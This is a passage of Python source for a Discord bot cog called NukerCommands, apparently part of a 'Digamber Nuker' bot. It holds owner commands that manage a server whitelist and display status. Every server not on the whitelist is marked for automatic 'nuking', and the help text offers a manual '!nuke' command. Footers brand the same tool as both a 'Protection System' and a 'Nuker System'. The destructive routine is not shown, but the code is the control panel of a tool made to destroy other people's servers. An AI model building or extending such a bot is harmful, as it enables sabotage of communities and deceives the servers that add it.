                value=f"• Server ID: `{ctx.guild.id}`\n• Member Count: `{ctx.guild.member_count}`\n• Channel Count: `{len(ctx.guild.channels)}`\n• Role Count: `{len(ctx.guild.roles)}`",
                inline=False
            )
            
            embed.set_footer(
                text="Digamber Protection System • 24/7 Monitoring",
                icon_url=ctx.guild.icon.url if ctx.guild.icon else ""
            )
            
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788996/shield.png")
            
            await ctx.send(embed=embed)
        else:
            await ctx.send("⚠️ This server is not whitelisted!")

    @commands.command(name='serverinfo')
    @commands.is_owner()
    async def server_info(self, ctx):
        """Detailed server info (Owner only)"""
        # Check if user is owner
        if ctx.author.id != self.owner_id and ctx.author.id != ctx.guild.owner_id:
            await ctx.send("❌ This command is for server owner only!")
            return
            
        # Professional server info embed
        embed = discord.Embed(
            title=f"📊 SERVER ANALYTICS - {ctx.guild.name}",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        embed.set_author(
            name="SERVER MANAGEMENT",
            icon_url=ctx.guild.icon.url if ctx.guild.icon else ""
        )
        
        embed.add_field(name="🆔 SERVER ID", value=f"```{ctx.guild.id}```", inline=False)
        embed.add_field(name="👑 OWNER", value=f"{ctx.guild.owner.mention}\n`{ctx.guild.owner}`", inline=True)
        embed.add_field(name="📅 CREATED", value=f"```{ctx.guild.created_at.strftime('%Y-%m-%d')}```", inline=True)
        
        embed.add_field(name="👥 MEMBERS", value=f"```{ctx.guild.member_count}```", inline=True)
        embed.add_field(name="📁 CHANNELS", value=f"```{len(ctx.guild.channels)}```", inline=True)
        embed.add_field(name="🎭 ROLES", value=f"```{len(ctx.guild.roles)}```", inline=True)
        
        # Protection status
        if self.is_whitelisted(ctx.guild.id):
            if ctx.guild.id in self.permanent_whitelist:
                status = "<a:emoji_1:1430081383757512785> **PERMANENT WHITELIST**"
                details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔒 PERMANENT\n• Removal: ❌ NOT ALLOWED"
            else:
                status = "<a:emoji_1:1430081383757512785> **DYNAMIC WHITELIST**"
                details = "• Auto-Nuke: ❌ DISABLED\n• Type: 🔧 DYNAMIC\n• Removal: <a:emoji_1:1430081383757512785> ALLOWED"
        else:
            status = "❌ **NOT WHITELISTED**"
            details = "• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Bot Safe: ❌ NO\n• Status: 💀 UNSAFE"
        
        embed.add_field(
            name="🛡️ NUKE PROTECTION", 
            value=f"{status}\n{details}",
            inline=False
        )
        
        embed.add_field(
            name="⚙️ BOT COMMANDS",
            value="```\n!protection - Check safety status\n!whitelisted - View safe servers\n!servers - All server list\n!nuke - Manual nuke (non-whitelisted)\n```",
            inline=False
        )
        
        embed.set_footer(text="Digamber Nuker System • Server Analytics")
        
        if ctx.guild.icon:
            embed.set_thumbnail(url=ctx.guild.icon.url)
            embed.set_image(url=ctx.guild.banner.url if ctx.guild.banner else "")
        
        await ctx.send(embed=embed)

    @commands.command(name='whitelist')
    @commands.is_owner()
    async def add_whitelist(self, ctx, server_id: int = None):
        """Current server ko whitelist mein add karo"""
        # Check if user is owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id in self.permanent_whitelist:
            await ctx.send("ℹ️ Server already in PERMANENT whitelist!")
            return
        
        if server_id not in self.whitelisted_servers:
            self.whitelisted_servers.append(server_id)
            self.save_whitelist()
            
            embed = discord.Embed(
                title="<a:emoji_1:1430081383757512785> SERVER WHITELISTED",
                color=0x00ff00,
                timestamp=datetime.utcnow()
            )
            embed.add_field(
                name="SERVER ADDED",
                value=f"**{ctx.guild.name}** has been added to dynamic whitelist.",
                inline=False
            )
            embed.add_field(
                name="🔧 PROTECTION ACTIVE",
                value=f"• Server ID: `{server_id}`\n• Status: <a:emoji_1:1430081383757512785> SAFE\n• Type: 🔧 DYNAMIC\n• Auto-Nuke: ❌ DISABLED",
                inline=False
            )
            embed.set_footer(text="Digamber Protection System • Server Secured")
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"ℹ️ Server already in dynamic whitelist!")

    @commands.command(name='unwhitelist')
    @commands.is_owner() 
    async def remove_whitelist(self, ctx, server_id: int = None):
        """Server ko whitelist se remove karo"""
        # Check if user is owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        if server_id is None:
            server_id = ctx.guild.id
        
        if server_id in self.permanent_whitelist:
            await ctx.send("❌ Cannot remove PERMANENT whitelist server!")
            return
        
        if server_id in self.whitelisted_servers:
            self.whitelisted_servers.remove(server_id)
            self.save_whitelist()
            
            embed = discord.Embed(
                title="⚠️ PROTECTION REMOVED",
                color=0xff9900,
                timestamp=datetime.utcnow()
            )
            embed.add_field(
                name="SERVER REMOVED",
                value=f"**{ctx.guild.name}** has been removed from dynamic whitelist.",
                inline=False
            )
            embed.add_field(
                name="🚨 WARNING",
                value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Protection: 🛡️ DISABLED",
                inline=False
            )
            embed.set_footer(text="Digamber Protection System • Protection Disabled")
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"❌ Server not in dynamic whitelist!")

    @commands.command(name='whitelisted')
    @commands.is_owner()
    async def show_whitelisted(self, ctx):
        """Show all whitelisted servers"""
        # Check if user is owner
        if ctx.author.id != self.owner_id and ctx.author.id != ctx.guild.owner_id:
            await ctx.send("❌ This command is for server owner only!")
            return
            
        if not self.permanent_whitelist and not self.whitelisted_servers:
            await ctx.send("❌ No servers in whitelist!")
            return
        
        embed = discord.Embed(
            title="🔒 WHITELISTED SERVERS DATABASE",
            color=0x00ff00,
            timestamp=datetime.utcnow()
        )
        
        # Permanent whitelist
        if self.permanent_whitelist:
            embed.add_field(
                name="🔐 PERMANENT WHITELIST",
                value="*Cannot be removed*",
                inline=False
            )
            
            for server_id in self.permanent_whitelist:
                guild = self.bot.get_guild(server_id)
                if guild:
                    embed.add_field(
                        name=f"<a:emoji_1:1430081383757512785> {guild.name}",
                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔒 PERMANENT",
                        inline=True
                    )
        
        # Dynamic whitelist
        if self.whitelisted_servers:
            embed.add_field(
                name="🔧 DYNAMIC WHITELIST",
                value="*Can be added/removed*",
                inline=False
            )
            
            for server_id in self.whitelisted_servers:
                guild = self.bot.get_guild(server_id)
                if guild:
                    embed.add_field(
                        name=f"🛡️ {guild.name}",
                        value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔧 DYNAMIC",
                        inline=True
                    )
        
        total_servers = len(self.permanent_whitelist) + len(self.whitelisted_servers)
        embed.set_footer(text=f"Total Protected Servers: {total_servers}")
        await ctx.send(embed=embed)

    @commands.command(name='servers')
    @commands.is_owner()
    async def show_all_servers(self, ctx):
        """Show all servers with whitelist status"""
        # Check if user is owner
        if ctx.author.id != self.owner_id:
            await ctx.send("❌ This command is for bot owner only!")
            return
            
        embed = discord.Embed(
            title="🌐 ALL CONNECTED SERVERS",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        for guild in self.bot.guilds:
            if guild.id in self.permanent_whitelist:
                status = "<a:emoji_1:1430081383757512785>141074670453 PERMANENT WHITELIST | 🔒 SAFE"
                emoji = "🔒"
            elif guild.id in self.whitelisted_servers:
                status = "<a:emoji_1:1430081383757512785> DYNAMIC WHITELIST | 🛡️ SAFE"
                emoji = "🛡️"
            else:
                status = "❌ NOT WHITELISTED | 💀 UNSAFE"
                emoji = "💀"
            
            embed.add_field(
                name=f"{emoji} {guild.name}",
                value=f"**ID:** `{guild.id}`\n**Status:** {status}\n**Members:** `{guild.member_count}`",
                inline=False
            )
        
        permanent_count = len(self.permanent_whitelist)
        dynamic_count = len(self.whitelisted_servers)
        total_servers = len(self.bot.guilds)
        protected_count = permanent_count + dynamic_count
        
        embed.set_footer(
            text=f"Total: {total_servers} | Permanent: {permanent_count} | Dynamic: {dynamic_count} | Protected: {protected_count}"
        )
        
        await ctx.send(embed=embed)

    @commands.command(name='status')
    async def check_status(self, ctx):
        """Check bot status"""
        embed = discord.Embed(
            title="🤖 BOT STATUS",
            color=0x3498db,
            timestamp=datetime.utcnow()
        )
        
        total_servers = len(self.bot.guilds)
        protected = sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))
        
        embed.add_field(
            name="🟢 STATUS",
            value=f"• **Bot:** `{self.bot.user.name}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Uptime:** `{self.get_uptime()}`",
            inline=False
        )
        
        embed.add_field(
            name="📊 SERVERS",
            value=f"• **Total:** `{total_servers}`\n• **Protected:** `{protected}`\n• **Unprotected:** `{total_servers - protected}`\n• **Admin Panel:** <a:emoji_1:1430081383757512785> ACTIVE",
            inline=False
        )
        
        embed.add_field(
            name="⚡ SYSTEM",
            value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Status Updates:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Rate Limit:** <a:emoji_1:1430081383757512785> OPTIMIZED",
            inline=False
        )
        
        embed.set_footer(text="Digamber Nuker Bot • 24/7 Operational")
        
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(NukerCommands(bot))
